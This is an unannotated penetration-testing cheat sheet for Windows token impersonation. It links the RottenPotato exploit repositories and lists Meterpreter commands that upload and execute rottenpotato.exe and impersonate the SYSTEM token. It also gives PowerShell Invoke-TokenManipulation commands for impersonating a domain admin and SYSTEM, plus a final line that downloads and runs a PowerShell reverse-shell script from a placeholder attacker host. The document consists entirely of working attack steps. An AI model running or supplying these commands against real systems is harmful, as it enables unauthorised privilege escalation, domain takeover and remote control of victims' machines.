	https://github.com/foxglovesec/RottenPotato 
	https://github.com/breenmachine/RottenPotatoNG
	Meterpreter>getuid
	Meterpreter>getprivs
	Meterpreter>use incognito
	Meterpreter>list_tokens -u
	Meterpreter>upload /root/Desktop/rottenpotato.exe
	Meterpreter>execute -HC -f rottenpotato.exe
	Meterpreter>impersonate_token "NT AUTHORITY\\SYSTEM"
	
	PS >Invoke-TokenManipulation -ImpersonateUser -Username "lab\domainadminuser"
	PS >Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"
	PS >Get-Process wininit | Invoke-TokenManipulation -CreateProcess "Powershell.exe -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://attackerip/Invoke-PowerShellTcp.ps1');\"};"